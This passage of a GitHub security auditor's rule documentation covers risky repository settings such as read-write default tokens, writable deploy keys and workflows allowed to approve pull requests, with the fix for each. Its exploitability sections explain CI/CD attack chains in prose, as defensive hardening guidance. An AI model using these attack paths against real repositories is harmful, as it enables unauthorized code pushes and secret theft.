[Archiving repositories](https://docs.github.com/en/repositories/archiving-a-github-repository/archiving-repositories)
and
[Setting repository visibility](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/managing-repository-settings/setting-repository-visibility).

<a id="repo006"></a>

### REPO006 — default-token-write

**Vulnerable pattern** — the repository's default `GITHUB_TOKEN` permission is read-write:

```yaml
# GET /repos/{owner}/{repo}/actions/permissions/workflow
default_workflow_permissions: write
```

In the UI this is `Settings → Actions → General` (`settings/actions`) → Workflow
permissions → "Read and write permissions". This is the repository-level twin of
[ORG004](#org004); the repository setting wins where both are set.

**Why it's exploitable** — this setting decides what every workflow that does not declare
its own `permissions:` block gets, and workflows without one are common
([GHA007](#gha007)). Read-write means a job that only runs tests is nevertheless holding a
token that can push to the default branch, create and modify releases, and edit issues and
pull requests. That matters the moment anything in the job executes code you did not
write — a compromised third-party action, a malicious transitive dependency's install
script, a `run:` step interpolating a PR title ([GHA005](#gha005)) — because the token is
sitting in the environment for it to take, and it is valid for the duration of the job
against your repository. The fix costs nothing where the workflow genuinely only reads,
which is most of them.

**Fix** — `Settings → Actions → General → Workflow permissions` → select "Read repository
contents and packages permissions", then grant write per workflow or per job where it is
actually needed:

```yaml
permissions:
  contents: read # the floor

jobs:
  release:
    permissions:
      contents: write # granted narrowly, and visible in review
```

The same default can be set for every repository at once from
`Organization Settings → Actions → General`; see [ORG004](#org004).

**Further reading** —
[Controlling permissions for GITHUB_TOKEN](https://docs.github.com/en/actions/how-tos/write-workflows/choose-what-workflows-do/control-permissions-for-github_token)
and
[Automatic token authentication](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication).

<a id="repo007"></a>

### REPO007 — actions-unrestricted

**Vulnerable pattern** — a public repository that allows any action from any author to
run:

```yaml
# GET /repos/{owner}/{repo}/actions/permissions
allowed_actions: all
```

In the UI this is `Settings → Actions → General` (`settings/actions`) → Actions
permissions → "Allow all actions and reusable workflows". The rule only reports this on
public repositories, where the workflows and the runners are exposed to strangers.

**Why it's exploitable** — every `uses:` line is a supply-chain dependency that executes
with your runner, your environment and your token. With no allow list, a workflow —
including one proposed in a pull request — can pull in any of the thousands of marketplace
actions, each of them a repository someone else controls. The realistic attacks are
account takeover of a small but widely used action, a maintainer's release pipeline being
compromised, and typosquatted names one character from a popular action. Restricting
allowed actions does not make a permitted action trustworthy, but it collapses the set of
authors who can run code in your CI from "anyone on GitHub" to a list you chose, which is
what makes the remaining risk reviewable. Combine it with SHA pinning ([GHA002](#gha002)),
which fixes *which version* of a permitted action runs.

**Fix** — `Settings → Actions → General → Actions permissions` → "Allow
`<owner>`, and select non-`<owner>`, actions and reusable workflows", then enable actions
created by GitHub and by Marketplace verified creators, and add specific patterns for
anything else you depend on:

```text
actions/*,
github/*,
docker/setup-buildx-action@*,
some-vendor/their-action@a1b2c3d4...
```

The same policy can be set once for every repository from
`Organization Settings → Actions → General`, which is the maintainable place for it.

**Further reading** —
[Managing GitHub Actions settings for a repository](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#managing-github-actions-permissions-for-your-repository)
and
[Security hardening for GitHub Actions: using third-party actions](https://docs.github.com/en/actions/reference/security/secure-use#using-third-party-actions).

## Access rules

These rules cover who can reach the repository and which of GitHub's own security features
are switched on for it: deploy keys, outside collaborators, secret scanning, push
protection, Dependabot alerts, and whether workflows may approve their own pull requests.
Several of them are visibility-sensitive — [ACC003](#acc003) and [ACC004](#acc004) only
fire on public repositories, where a leak is public the moment it is pushed — and
[ACC005](#acc005) skips archived repositories, which cannot be patched anyway. Source:
[`src/github_auditor/analyze/rules/access_rules.py`](../src/github_auditor/analyze/rules/access_rules.py).

<a id="acc001"></a>

### ACC001 — writable-deploy-key

**Vulnerable pattern** — a deploy key on the repository that is not read-only:

```yaml
# GET /repos/{owner}/{repo}/keys
- id: 91827364
  title: ci-deploy
  read_only: false # write access to this repository
```

In the UI these live at `Settings → Deploy keys` (`settings/keys`); a writable key is the
one added with "Allow write access" ticked. The finding names the key's title, its id and
the date it was created, because that is usually the only way anyone still remembers what
it was for.

**Why it's exploitable** — a deploy key is an SSH key bound to a repository rather than to
a person, and that is exactly what makes a writable one dangerous. It does not expire, it
is not covered by the org's 2FA or SSO requirements ([ORG001](#org001)), it survives the
offboarding of whoever created it, and revoking a compromised employee's account does not
touch it. Its use is not attributable to a human in the audit log, so a leaked key grants
quiet, indefinite push access: the copy sitting on an old build server, in a CI
environment variable, or in a container image someone published is a working credential for
as long as nobody notices. Write access to the repository is write access to what CI
runs, so this chains straight into workflow execution with your secrets.

**Fix** — remove the key, or re-add it read-only. Most deploy keys only need to clone:

```yaml
# POST /repos/{owner}/{repo}/keys
title: ci-deploy
key: ssh-ed25519 AAAA...
read_only: true # the default, and almost always sufficient
```

For the cases that genuinely need to push — a release bot, a docs-publishing job — prefer
a GitHub App installation token or a fine-grained token with a short lifetime over a
never-expiring key, and if a writable key must stay, record its owner and rotate it on a
schedule.

**Further reading** —
[Managing deploy keys](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/managing-deploy-keys)
and
[Keeping your API credentials secure](https://docs.github.com/en/rest/authentication/keeping-your-api-credentials-secure).

<a id="acc002"></a>

### ACC002 — outside-collaborator-write

**Vulnerable pattern** — someone who is not a member of the organization holds `push`,
`maintain` or `admin` on the repository:

```yaml
# GET /repos/{owner}/{repo}/collaborators?affiliation=outside
- login: contractor-bob
  permission: push # write access, without org membership
```

`Settings → Collaborators and teams` (`settings/access`) lists them as outside
collaborators. The rule grades `admin` as high and `push`/`maintain` as medium, since an
outside admin can also change the repository's settings — including the ones every other
rule on this page checks.

**Why it's exploitable** — outside collaborators sit outside every control the
organization applies to its members. Required two-factor authentication does not cover
them the way it covers members, SAML/SSO sign-on is not enforced on them, and they are
invisible to the team- and role-based reviews organizations actually perform, so an
account that was added for a two-week engagement keeps write access for years. That makes
them the weakest credential with commit rights: compromising a contractor's personal
GitHub account gives an attacker a push into your default branch, and from there whatever
your workflows run with. Access also tends to be granted repo-by-repo and revoked never,
so the real exposure is usually larger than anyone expects until it is listed.

**Fix** — audit the list and pick one of three outcomes per person: convert long-term
collaborators into organization members (which puts them under 2FA, SSO and team
permissions), downgrade anyone who only needs to read to `read`/`triage`, and remove
everyone whose engagement is over. Organization owners can also require approval for
inviting outside collaborators and run periodic access reviews from
`Organization Settings → Member privileges`.

**Further reading** —
[Adding outside collaborators to repositories in your organization](https://docs.github.com/en/organizations/managing-user-access-to-your-organizations-repositories/managing-outside-collaborators/adding-outside-collaborators-to-repositories-in-your-organization)
and
[Repository roles for an organization](https://docs.github.com/en/organizations/managing-user-access-to-your-organizations-repositories/managing-repository-roles/repository-roles-for-an-organization).

<a id="acc003"></a>

### ACC003 — secret-scanning-disabled

**Vulnerable pattern** — a public repository with secret scanning switched off:

```yaml
# GET /repos/{owner}/{repo}
visibility: public
security_and_analysis:
  secret_scanning:
    status: disabled
```

The setting is `Settings → Code security` (`settings/security_analysis`). The rule only
fires on public repositories, where the feature is free and the consequence of a leak is
immediate.

**Why it's exploitable** — a credential committed by accident stays in the git history
after the file is "removed" in a later commit; every clone still carries it. On a public
repository that history is indexed within minutes: bots watch the public events firehose
specifically for newly pushed tokens, and the observed time from push to first use of a
leaked cloud key is minutes, not days. Without secret scanning nobody on your side is
looking at all, so the first signal is the bill, the abuse report, or the incident.
Secret scanning closes that gap by matching known credential formats across the repository
*and its whole history*, and — for supported providers — notifying the issuer so the token
can be revoked before it is used.

**Fix** — `Settings → Code security → Secret scanning` → Enable. It is free on public
repositories (GitHub Advanced Security on private ones), and enabling it triggers a scan
of existing history, not just future pushes:

```yaml
security_and_analysis:
  secret_scanning:
    status: enabled
```

Treat what the initial scan finds as already compromised: rotate the credential first,
then clean up the history. Enable [ACC004](#acc004) push protection at the same time so
the next one never lands.

**Further reading** —
[About secret scanning](https://docs.github.com/en/code-security/secret-scanning/introduction/about-secret-scanning)
and
[Configuring secret scanning for your repository](https://docs.github.com/en/code-security/secret-scanning/enabling-secret-scanning-features/enabling-secret-scanning-for-your-repository).

<a id="acc004"></a>

### ACC004 — push-protection-disabled

**Vulnerable pattern** — a public repository where secret scanning may be on, but push
protection is not:

```yaml
# GET /repos/{owner}/{repo}
visibility: public
security_and_analysis:
  secret_scanning_push_protection:
    status: disabled
```

`Settings → Code security → Secret scanning → Push protection`. This is graded low on its
own because it is a hardening measure layered on [ACC003](#acc003) rather than the
detection itself.

**Why it's exploitable** — detection after the fact and prevention are not the same
control. Without push protection the first thing that happens to a leaked key is that it
becomes public; the alert arrives afterwards, and by then the only safe response is
rotation plus a history rewrite that every collaborator has to re-clone around. Push
protection moves the check to `git push` and blocks the push outright, so the credential
never reaches a public commit. The cost of a false positive is one bypass dialog with a
recorded reason; the cost of a miss is an incident.

**Fix** — `Settings → Code security → Secret scanning` → enable "Push protection":

```yaml
security_and_analysis:
  secret_scanning_push_protection:
    status: enabled
```

Organization owners can enable it — along with secret scanning itself — for all current and
new repositories at once from `Organization Settings → Code security`, which is the
setting worth changing if this rule fires across many repos. Bypasses are auditable, so
review them rather than relying on developers to self-police.

**Further reading** —
[Push protection for repositories and organizations](https://docs.github.com/en/code-security/secret-scanning/introduction/about-push-protection)
and
[Enabling push protection](https://docs.github.com/en/code-security/secret-scanning/enabling-secret-scanning-features/enabling-push-protection-for-your-repository).

<a id="acc005"></a>

### ACC005 — dependabot-alerts-disabled

**Vulnerable pattern** — Dependabot vulnerability alerts are off on a repository that is
still live:

```yaml
# GET /repos/{owner}/{repo}/vulnerability-alerts -> 404 (disabled)
security_and_analysis:
  dependabot_security_updates:
    status: disabled
```

`Settings → Code security` (`settings/security_analysis`) → Dependabot alerts. Archived
repositories are skipped, because nothing can be merged into them; if an archived repo
still has workflows, [REPO005](#repo005) is the rule that covers it.

**Why it's exploitable** — dependencies do not get more secure while you ignore them. With
alerts off there is no signal when a package you already ship picks up a known CVE, so the
vulnerable version stays pinned in the lockfile indefinitely and the exposure is discovered
by whoever scans you from outside. It matters for CI specifically as well: Dependabot reads
`.github/workflows/`, so it is also what tells you that an action you pinned to a SHA
([GHA002](#gha002)) has a known-vulnerable release — a pin freezes the version, which is
the point, but it also means you will not drift onto the fix by accident. Alerts are the
only part of this that is free and passive; leaving them off saves nothing.

**Fix** — `Settings → Code security` → enable "Dependabot alerts", and enable "Dependabot
security updates" alongside them so fixes arrive as pull requests instead of as a list.
Add a `.github/dependabot.yml` to keep actions themselves current:

```yaml
version: 2
updates:
  - package-ecosystem: github-actions
    directory: /
    schedule:
      interval: weekly
```

Organization owners can switch both on for all repositories from
`Organization Settings → Code security`.

**Further reading** —
[About Dependabot alerts](https://docs.github.com/en/code-security/dependabot/dependabot-alerts/about-dependabot-alerts)
and
[Keeping your actions up to date with Dependabot](https://docs.github.com/en/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot).

<a id="acc006"></a>

### ACC006 — actions-can-approve-prs

**Vulnerable pattern** — the repository lets workflows open and approve pull requests:

```yaml
# GET /repos/{owner}/{repo}/actions/permissions/workflow
can_approve_pull_request_reviews: true
```

`Settings → Actions → General` (`settings/actions`) → Workflow permissions → "Allow GitHub
Actions to create and approve pull requests". The rule grades this high on public
repositories and medium on private ones, since a public repo hands the prerequisite — the
ability to propose a workflow-triggering change — to anyone.

**Why it's exploitable** — required reviews are the control that stops a single
compromised credential from shipping code. This checkbox makes the `GITHUB_TOKEN` a valid
approver, which means any path to code execution inside a workflow becomes a path to a
merged commit. Chain it with any of the execution bugs on this page — a pwn request
([GHA001](#gha001)), script injection ([GHA005](#gha005)), a compromised unpinned action
([GHA002](#gha002)) — and the attacker's own pull request can be approved by the token and
merged by automation, with the branch protection rule reporting itself satisfied. The
second pair of eyes never existed; the audit trail shows an approval from
`github-actions[bot]`. It is also the same setting as [ORG005](#org005) one level up, so
check both: an org-wide "allow" is what most repositories inherit.

**Fix** — `Settings → Actions → General → Workflow permissions` → untick "Allow GitHub
Actions to create and approve pull requests":

```yaml
can_approve_pull_request_reviews: false
```

Automation that legitimately needs to open pull requests — a dependency bumper, a docs
generator — should keep *creating* them under a separate identity (a GitHub App
installation token or a dedicated bot account), and still be reviewed by a human. If you
want those PRs to merge unattended, do it with an explicitly scoped app and required
status checks, not by letting the repository's own token approve its own changes. Set the
same default org-wide from `Organization Settings → Actions → General`.

**Further reading** —
[Preventing GitHub Actions from creating or approving pull requests](https://docs.github.com/en/repositories/managing-your-repositorys-settings-and-features/enabling-features-for-your-repository/managing-github-actions-settings-for-a-repository#preventing-github-actions-from-creating-or-approving-pull-requests)
and
[Security hardening for GitHub Actions](https://docs.github.com/en/actions/reference/security/secure-use).
